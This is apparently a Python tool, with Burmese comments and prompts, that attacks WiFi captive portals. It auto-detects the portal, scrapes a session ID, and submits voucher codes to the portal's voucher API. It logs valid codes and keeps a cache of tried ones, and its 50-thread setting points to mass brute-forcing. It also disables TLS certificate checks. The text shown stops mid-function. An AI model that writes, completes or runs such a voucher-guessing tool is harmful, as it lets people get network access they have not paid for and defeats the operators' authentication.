import requests
import re
import urllib3
import time
import threading
import os
import ssl
import random
from urllib.parse import urlparse, parse_qs, urljoin

# --- SSL ERROR FIX ---
ssl._create_default_https_context = ssl._create_unverified_context
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- CONFIGURATION ---
SUCCESS_CODES_FILE = "success.txt"
TRIED_CODES_FILE = "tried.txt"
VOUCHER_THREADS = 50 # Threads အရေအတွက် (လိုအပ်လျှင် တိုးနိုင်သည်)

# --- CLEAR SCREEN FUNCTION ---
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# --- CACHE MANAGEMENT ---
def load_tried_codes():
    if not os.path.exists(TRIED_CODES_FILE):
        return set()
    with open(TRIED_CODES_FILE, "r") as f:
        return set(line.strip() for line in f)

def save_tried_code(code):
    with open(TRIED_CODES_FILE, "a") as f:
        f.write(f"{code}\n")

# --- PORTAL AUTO DETECT ---
def get_portal_info():
    """Captive Portal URL ကို အလိုအလျောက်ရှာဖွေခြင်း"""
    test_url = "http://connectivitycheck.gstatic.com/generate_204"
    try:
        r = requests.get(test_url, allow_redirects=True, timeout=5)
        if r.url != test_url:
            parsed = urlparse(r.url)
            return f"{parsed.scheme}://{parsed.netloc}", r.url
    except:
        pass
    return None, None

def get_session_id(session, portal_url):
    """Session ID ယူခြင်း"""
    try:
        r1 = session.get(portal_url, verify=False, timeout=10)
        path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
        next_url = urljoin(portal_url, path_match.group(1)) if path_match else portal_url
        r2 = session.get(next_url, verify=False, timeout=10)
        
        sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
        if not sid:
            sid_match = re.search(r'sessionId=([a-zA-Z0-9]+)', r2.text)
            sid = sid_match.group(1) if sid_match else None
        return sid
    except:
        return None

# --- MENU 1: TEST SPECIFIC CODE ---
def test_specific_code():
    code_to_test = input("\n👉 စမ်းသပ်လိုသည့် Code ကိုရိုက်ပါ: ")
    print(f"\n🔍 စမ်းသပ်နေသည်: {code_to_test} ...")
    
    portal_host, portal_url = get_portal_info()
    if not portal_host:
        print("❌ Captive Portal ကို ရှာမတွေ့ပါ။")
        return

    session = requests.Session()
    sid = get_session_id(session, portal_url)
    
    if not sid:
        print("❌ Session ID ယူမရပါ။")
        return
    
    voucher_api = f"{portal_host}/api/auth/voucher/"
    
    try:
        v_res = session.post(voucher_api, json={'accessCode': code_to_test, 'sessionId': sid, 'apiVersion': 1}, timeout=5)
        
        if v_res.status_code == 200 and "\"success\":true" in v_res.text:
            print(f"\n\033[92m✅ SUCCESS! Valid Code Found: {code_to_test}\033[0m")
            with open(SUCCESS_CODES_FILE, "a") as f:
                f.write(f"{code_to_test}\n")
        else:
            print(f"\n❌ FAIL! Invalid Code: {code_to_test}")
            
    except Exception as e:
        print(f"\n❌ Error: {e}")
    
    time.sleep(3)

# --- MENU 2: INTERNET ACCESS ---
def use_internet_access():
    print("\n🌐 Internet Access အတွက် Code စစ်ဆေးနေသည်...")
    
    if not os.path.exists(SUCCESS_CODES_FILE):
        print("❌ Success Codes များမရှိပါ။")
        time.sleep(2)
        return

    with open(SUCCESS_CODES_FILE, "r") as f:
        codes = [line.strip() for line in f.readlines()
                 
